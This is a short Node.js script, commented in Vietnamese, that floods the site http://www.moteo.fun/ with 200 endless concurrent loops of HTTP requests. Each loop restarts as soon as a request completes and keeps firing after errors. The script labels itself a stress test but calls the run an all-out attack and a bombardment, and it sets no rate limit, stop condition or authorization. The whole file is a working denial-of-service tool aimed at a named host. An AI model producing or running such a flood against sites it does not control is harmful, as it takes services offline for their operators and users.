const http = require('http');

const URL = 'http://www.moteo.fun/';
const CONCURRENCY = 200; // Số lượng khách hàng ảo cùng lúc truy cập liên tục
let requestCount = 0;

console.log(`🚀 Bắt đầu cuộc tấn công tổng lực (Stress Test) vào: ${URL}`);
console.log(`🤖 Mức độ: ${CONCURRENCY} truy cập ảo chạy cùng một thời điểm`);
console.log(`(Nhấn Ctrl+C bất cứ lúc nào để dừng lại)`);
console.log('------------------------------------------------------------');

function sendRequest() {
    http.get(URL, (res) => {
        requestCount++;
        
        // Cứ mỗi 1000 requests thì báo cáo tiến độ 1 lần
        if (requestCount % 1000 === 0) {
            console.log(`🔥 Đã oanh tạc: ${requestCount} lượt requests...`);
        }
        
        // Nhận dữ liệu (để Node dọn rác nhẹ nhàng hơn)
        res.on('data', () => {}); 
        res.on('end', () => {
            // Ngay khi kết nối hoàn thành thì lại tiếp tục bắn request mới luôn (loop vô tận)
            sendRequest();
        });
    }).on('error', (err) => {
        console.error(`❌ Request thất bại (${err.message})... Vẫn tiếp tục tấn công!`);
        // Kể cả có lỗi chập chờn cũng phải bắn tiếp
        setTimeout(sendRequest, 100); 
    });
}

// Khởi chạy hàng loạt khách ảo
for (let i = 0; i < CONCURRENCY; i++) {
    sendRequest();
}
